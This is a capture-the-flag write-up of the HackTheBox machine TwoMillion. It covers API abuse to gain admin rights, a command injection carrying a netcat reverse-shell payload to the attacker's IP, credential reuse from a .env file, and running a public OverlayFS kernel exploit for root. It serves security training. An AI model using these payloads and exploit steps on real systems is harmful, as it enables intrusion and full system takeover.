---
title: Write-up TwoMillion on HTB
author: eMVee
date: 2024-05-20 10:00:00 +0000
categories: [CTF, HTB]
tags: [HTB, Command Injection, environment-password ,password-reuse  ,CVE-2023-2640, overlayfs , PATH hijack, OSWA, WEB200]
render_with_liquid: false
---

The box takes us back to the early days of HackTheBox, featuring an old version of the platform that includes the old hackable invite code. By exploiting this vulnerability, you'll be able to create an account on the platform and enumerate various API endpoints. One of these endpoints can be used to elevate your user access to an Administrator, allowing you to perform a command injection in the admin VPN generation endpoint and gain a system shell.

From there, you'll uncover an .env file containing database credentials. With some clever enumeration and password re-use, you'll be able to log in as the user "admin" on the box. But we're not done yet! You'll find that the system kernel is outdated, and you can exploit CVE-2023-0386 to gain a root shell and complete the challenge.

Get ready to put your Linux and web application exploitation skills to the test in this exciting walkthrough. Let's dive in!

## Getting started

First we should create a project directory for our target and assign the IP address to a variable.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mcd TwoMillion

┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion]
└─$ ip=10.129.220.249

```

## Enumeration
We are ready to rumble! Let's start with a simple ping request to see if the target will response to it.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion]
└─$ ping $ip -c3
PING 10.129.220.249 (10.129.220.249) 56(84) bytes of data.
64 bytes from 10.129.220.249: icmp_seq=1 ttl=63 time=7.78 ms
64 bytes from 10.129.220.249: icmp_seq=2 ttl=63 time=7.57 ms
64 bytes from 10.129.220.249: icmp_seq=3 ttl=63 time=8.95 ms

--- 10.129.220.249 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2008ms
rtt min/avg/max/mdev = 7.565/8.098/8.953/0.610 ms

```
The target does response and we can see the value 63 in the `ttl` field. This is a good indicator that the target is running on a Linux operating system. Next we should discover what ports are open and what services are running on them.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion]
└─$ nmap $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 19:54 CEST
Nmap scan report for 10.129.220.249
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds

```

- Linux, not sure what operating system
- Port 22
	- SSH
- Port 80
	- HTTP

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 19:54 CEST
Nmap scan report for 10.129.220.249
Host is up (0.0083s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/20%OT=22%CT=1%CU=39898%PV=Y%DS=2%DC=T%G=Y%TM=664B
OS:8E69%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C
OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT     ADDRESS
1   7.51 ms 10.10.14.1
2   7.56 ms 10.129.220.249

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.87 seconds

```

- Linux, probably [Ubuntu 22.04](https://launchpad.net/ubuntu/jammy/i386/openssh-server/1:8.9p1-3ubuntu0.1)
- Port 22
	- SSH
	- OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
- Port 80
	- HTTP
	- nginx
	- redirect to: http://2million.htb/

Let's add the domain name for this machine to our `/etc/hosts` file.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion]
└─$ sudo nano /etc/hosts     

┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion]
└─$ cat /etc/hosts      
127.0.0.1       localhost
127.0.1.1       kali

# HTB
10.129.220.249 2million.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```
Now we can run tools like whatweb, nikto and dirsearch.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion]
└─$ whatweb http://$ip  
http://10.129.220.249 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.129.220.249], RedirectLocation[http://2million.htb/], Title[301 Moved Permanently], nginx
http://2million.htb/ [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[info@hackthebox.eu], Frame, HTML5, HTTPServer[nginx], IP[10.129.220.249], Meta-Author[Hack The Box], Script, Title[Hack The Box :: Penetration Testing Labs], X-UA-Compatible[IE=edge], YouTube, nginx

```
Whatweb discovered an email address and the title of the website.
- An email: info@hackthebox.eu
- Title: `Hack The Box :: Penetration Testing Labs`

We should now run nikto to see if it can identify some known vulnerabilities.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion]
└─$ nikto -h http://2million.htb/
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.220.249
+ Target Hostname:    2million.htb
+ Target Port:        80
+ Start Time:         2024-05-20 19:59:25 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
>+ 7963 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2024-05-20 20:01:23 (GMT2) (118 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Nothing useful is found by nikto. Let's enumerate some directories and files with dirsearch.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion]
└─$ url=http://2million.htb/         

┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion]
└─$ dirsearch -u $url -e bak,old,php 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                    (_||| _) (/_(_|| (_| )                                                            
  
Extensions: bak, old, php | HTTP method: GET | Threads: 25 | Wordlist size: 10458

Output File: /home/emvee/Documents/HTB/TwoMillion/reports/http_2million.htb/__24-05-20_20-05-15.txt

Target: http://2million.htb/

[20:05:15] Starting:                                                                                                                                                                                                                       
[20:05:22] 200 -    2KB - /404                                              
[20:05:33] 401 -    0B  - /api                                              
[20:05:33] 401 -    0B  - /api/v1                                           
[20:05:34] 301 -  162B  - /assets  ->  http://2million.htb/assets/          
[20:05:34] 403 -  548B  - /assets/
[20:05:40] 403 -  548B  - /controllers/                                     
[20:05:41] 301 -  162B  - /css  ->  http://2million.htb/css/                
[20:05:46] 301 -  162B  - /fonts  ->  http://2million.htb/fonts/            
[20:05:49] 302 -    0B  - /home  ->  /                                      
[20:05:50] 403 -  548B  - /images/                                          
[20:05:50] 301 -  162B  - /images  ->  http://2million.htb/images/          
[20:05:52] 301 -  162B  - /js  ->  http://2million.htb/js/                  
[20:05:52] 403 -  548B  - /js/                                              
[20:05:54] 200 -    4KB - /login                                            
[20:05:55] 302 -    0B  - /logout  ->  /                                    
[20:06:07] 200 -    4KB - /register                                         
[20:06:20] 301 -  162B  - /views  ->  http://2million.htb/views/            

Task Completed                                                                         
```

There are some interesting directories found with dirsearch. We should add them to our notes:
- api
- api/v1
- register
- login

Let's start Burp Suite in the back ground and navigate to the website.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520200447.png){: width="700" height="400" }


While we are using Burp in the background we should visit as much as possible pages to gather information about the website. Let's start at the register page.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520200800.png){: width="700" height="400" }


A invite code is needed to register. This is an old website of Hack The Box. They hit this challenge before you could join. This is something I can remember. We should check Burp Suite and find the JavaScript file that could help us.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520201712.png){: width="700" height="400" }


The JavaScript content gives us information what method we can use. This can be done in the console in the web browser.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520202105.png){: width="700" height="400" }


We got a encrypted (ROT13) message. This can be decrypted with cyberchef.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520202251.png){: width="700" height="400" }


It looks like we have to send a POST request to an API. We can use Burp easily since we captured already a lot of requests.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520202525.png){: width="700" height="400" }


A base64 code is returned. We can decode the base64 code in our terminal.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion]
└─$ echo 'NVBERkstVDZQU1ItMEpCUlotVVRJWVk=' | base64 -d      
5PDFK-T6PSR-0JBRZ-UTIYY  
```
Now we got a invite code. This should be used in the invite endpoint.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520202628.png){: width="700" height="400" }


Just one more step before we can logon. We have to create an account for HTB.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520202654.png){: width="700" height="400" }


Since our account is created, we can try to logon.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520202724.png){: width="700" height="400" }


The famous dashboard from the past is shown to us. There are so much menu items. Where should we start is the question popping in my mind. Lucky for us, most of the hyperlinks are not working.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520202736.png){: width="700" height="400" }


One of the hyperlinks is working and showing us the page `Access`.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520203207.png){: width="700" height="400" }


We could download the VPN file. But not sure what we should look for we should check Burp again. We can see several API things. Let's try to send a GET request to `/api/v1` to see how the response is.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520203432.png){: width="700" height="400" }


A lot of endpoints are shown. Even the HTTP Method is shown in front.
One of the API endpoint looks interesting. It is something about updating user settings.

```
"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}
```

Let's just sent a PUT request to this endpoint to see how the system reacts.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520203902.png){: width="700" height="400" }


It looks like we did not sent any Content-Type to the endpoint. We should add the following header: `Content-Type: application/json` and try to sent it again.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520203947.png){: width="700" height="400" }


This time we are missing a parameter (email). We should add our email address and parameter in json format and send the request again.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520204059.png){: width="700" height="400" }


It expects the `is_admin` parameter. We did not know this and did not send it. This field is probably a Boolean. So we have to add it with the value `true`. 

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520204148.png){: width="700" height="400" }


Well true, was not correct. It expects a `1` or a `0`. We should use `1` to set the value to `true`. After changing this we can send the request again.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520204210.png){: width="700" height="400" }


We got a success message! Now we can check if we are indeed an admin with the following API endpoint.

```
"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"
```

Let's send the request with Burp.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520204430.png){: width="700" height="400" }


So we have admin privileges now. We should probably now look for the generate VPN for another user.

```
"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},
```

Let's just send a an empty request to the API, to see how it will respond.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520205313.png){: width="700" height="400" }


We should have sent the request with the field `username`. So let's add it and sent it again.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520205352.png){: width="700" height="400" }


We got a response, but it looks like there are more details then it should be. Perhaps we can run system command via the API. Let's try it with `; id; whoami #` to see who we are.


![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520205450.png){: width="700" height="400" }


It looks like we are running commands as `www-data`. If we can run system command we might be able to start a reverse shell.
## Initial access
Let's start a netcat listener on our attacker machine.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion]
└─$ rlwrap nc -lvp 443
listening on [any] 443 ...

```

The reverse shell payload should look like this.
```
{
	"username":"emvee; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.17 443 >/tmp/f #"
}
```
Now we can send the request with Burp Suite Repeater.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520205852.png){: width="700" height="400" }


Let's check our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion]
└─$ rlwrap nc -lvp 443
listening on [any] 443 ...
connect to [10.10.14.17] from 2million.htb [10.129.220.249] 33816
sh: 0: can't access tty; job control turned off
$ 

```
Since we have a reverse shell connection we should check:
- who we are, 
- what are our memberships
- on what machine we are working (hostname)
- Any network interface on the victim

```bash
$ whoami;id;hostname;ip a
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
2million
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:b6:28 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.220.249/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2776sec preferred_lft 2776sec
    inet6 dead:beef::250:56ff:fe94:b628/64 scope global dynamic mngtmpaddr 
       valid_lft 86397sec preferred_lft 14397sec
    inet6 fe80::250:56ff:fe94:b628/64 scope link 
       valid_lft forever preferred_lft forever
$ ls /home
admin
$ ls -ahlR /home
/home:
total 12K
drwxr-xr-x  3 root  root  4.0K Jun  6  2023 .
drwxr-xr-x 19 root  root  4.0K Jun  6  2023 ..
drwxr-xr-x  4 admin admin 4.0K Jun  6  2023 admin

/home/admin:
total 32K
drwxr-xr-x 4 admin admin 4.0K Jun  6  2023 .
drwxr-xr-x 3 root  root  4.0K Jun  6  2023 ..
lrwxrwxrwx 1 root  root     9 May 26  2023 .bash_history -> /dev/null
-rw-r--r-- 1 admin admin  220 May 26  2023 .bash_logout
-rw-r--r-- 1 admin admin 3.7K May 26  2023 .bashrc
drwx------ 2 admin admin 4.0K Jun  6  2023 .cache
-rw-r--r-- 1 admin admin  807 May 26  2023 .profile
drwx------ 2 admin admin 4.0K Jun  6  2023 .ssh
-rw-r----- 1 root  admin   33 May 20 17:53 user.txt
ls: cannot open directory '/home/admin/.cache': Permission denied
ls: cannot open directory '/home/admin/.ssh': Permission denied
$ 

```

Let's find out were we are working and what files are available for us.
```bash
$ pwd
/var/www/html
$ ls -la
total 56
drwxr-xr-x 10 root root 4096 May 20 19:00 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 May 20 19:00 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
$ 
```
In `.env` (environment) files we can find most often crucial information about a system. We should inspect this file and collect any juicy information.
```bash
$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
$ 

```
## Privilege escalation
We have now credentials of the user `admin`, we should try to use them and logon via the SSH service. This will give us a better shell than upgrading our reverse shell.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion]
└─$ ssh admin@$ip                
The authenticity of host '10.129.220.249 (10.129.220.249)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.220.249' (ED25519) to the list of known hosts.
admin@10.129.220.249's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon May 20 07:01:48 PM UTC 2024

  System load:           0.0
  Usage of /:            75.0% of 4.82GB
  Memory usage:          8%
  Swap usage:            0%
  Processes:             220
  Users logged in:       0
  IPv4 address for eth0: 10.129.220.249
  IPv6 address for eth0: dead:beef::250:56ff:fe94:b628

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ 

```
In the welcome message we can see, that we are working on an Ubuntu 22.04.2 LTS. This is something we predicted based on the SSH service running on this machine. Another thing in the welcome message is this line: `You have mail.` We should read the email after capturing the user flag. Since we are the `admin` we can capture the user flag from the home directory without changing the working directory.
```bash
admin@2million:~$ cat user.txt
<HERE IS THE USER FLAG>
```
Let's read the email first.
```bash
admin@2million:~$ cat /var/mail/admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather

```
We have low privileges still, so we should try to find a way to escalate our privileges. The email is a good hint in what direction we can look for. First lets check our kernel version on the target

```bash
admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
admin@2million:~$ uname -mrs
Linux 5.15.70-051570-generic x86_64

```

Let's use out Google Fu to find some information about this vulnerability
![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520212130.png){: width="700" height="400" }


There is a Github page with an exploit.
```
https://github.com/sxlmnwb/CVE-2023-0386
```
We should read about this exploit before we try any exploit. After reading about the exploit we can download the exploit as ZIP to our attacker machine. Then we should host is via the python web server.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/TwoMillion/CVE-2023-0386]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Now we should download the ZIP archive and unzip it on the victim.
```bash
admin@2million:~$ wget http://10.10.14.17/CVE-2023-0386-master.zip
--2024-05-20 19:33:37--  http://10.10.14.17/CVE-2023-0386-master.zip
Connecting to 10.10.14.17:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11579 (11K) [application/zip]
Saving to: ‘CVE-2023-0386-master.zip’

CVE-2023-0386-master.zip                                   100%[========================================================================================================================================>]  11.31K  --.-KB/s    in 0.001s  

2024-05-20 19:33:37 (12.1 MB/s) - ‘CVE-2023-0386-master.zip’ saved [11579/11579]

admin@2million:~$ unzip CVE-2023-0386-master.zip
Archive:  CVE-2023-0386-master.zip
737d8f4af6b18123443be2aed97ade5dc3757e63
   creating: CVE-2023-0386-master/
  inflating: CVE-2023-0386-master/Makefile  
  inflating: CVE-2023-0386-master/README.md  
  inflating: CVE-2023-0386-master/exp.c  
  inflating: CVE-2023-0386-master/fuse.c  
  inflating: CVE-2023-0386-master/getshell.c  
   creating: CVE-2023-0386-master/ovlcap/
 extracting: CVE-2023-0386-master/ovlcap/.gitkeep  
   creating: CVE-2023-0386-master/test/
  inflating: CVE-2023-0386-master/test/fuse_test.c  
  inflating: CVE-2023-0386-master/test/mnt  
  inflating: CVE-2023-0386-master/test/mnt.c  
admin@2million:~$ 

```
Now we should run the `make` command so we can run the exploit in a few minutes.
```bash
admin@2million:~$ cd CVE-2023-0386-master/
admin@2million:~/CVE-2023-0386-master$ make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
      |                     |     |
      |                     int   off_t {aka long int}
      |                    %ld
fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
  107 |     printf("size %d\n", size);
      |                  ~^     ~~~~
      |                   |     |
      |                   int   size_t {aka long unsigned int}
      |                  %ld
fuse.c: In function ‘main’:
fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  214 |     while (read(fd, content + clen, 1) > 0)
      |            ^~~~
      |            fread
fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
  216 |     close(fd);
      |     ^~~~~
      |     pclose
fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
  221 |     rmdir(mount_path);
      |     ^~~~~
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c

```

```bash
admin@2million:~/CVE-2023-0386-master$ ll
total 1452
drwxrwxr-x 4 admin admin    4096 May 20 19:34 ./
drwxr-xr-x 5 admin admin    4096 May 20 19:33 ../
-rwxrwxr-x 1 admin admin   17160 May 20 19:34 exp*
-rw-rw-r-- 1 admin admin    3093 May 16  2023 exp.c
-rwxrwxr-x 1 admin admin 1407736 May 20 19:34 fuse*
-rw-rw-r-- 1 admin admin    5616 May 16  2023 fuse.c
-rwxrwxr-x 1 admin admin   16096 May 20 19:34 gc*
-rw-rw-r-- 1 admin admin     549 May 16  2023 getshell.c
-rw-rw-r-- 1 admin admin     150 May 16  2023 Makefile
drwxrwxr-x 2 admin admin    4096 May 16  2023 ovlcap/
-rw-rw-r-- 1 admin admin     180 May 16  2023 README.md
drwxrwxr-x 2 admin admin    4096 May 16  2023 test/
admin@2million:~/CVE-2023-0386-master$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0


```
This shell hangs, now we should run the other part of the exploit in the second shell.
```bash
admin@2million:~/CVE-2023-0386-master$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 May 20 19:37 .
drwxrwxr-x 6 root   root     4096 May 20 19:37 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:~/CVE-2023-0386-master# 

```
Now we got a root shell on this machine! Let's capture the root.txt file as flag.
```bash
root@2million:~/CVE-2023-0386-master# cd ~
root@2million:~# whoami;id;hostname;ip a; cat /root/root.txt
root
uid=0(root) gid=0(root) groups=0(root),1000(admin)
2million
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:b6:28 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.220.249/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 3292sec preferred_lft 3292sec
    inet6 dead:beef::250:56ff:fe94:b628/64 scope global dynamic mngtmpaddr 
       valid_lft 86397sec preferred_lft 14397sec
    inet6 fe80::250:56ff:fe94:b628/64 scope link 
       valid_lft forever preferred_lft forever
<HERE IS THE ROOT FLAG>

```
## Post exploitation

In the root directory there was a `thank_you.json` file present
```bash
root@2million:/root# cat thank_you.json 
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e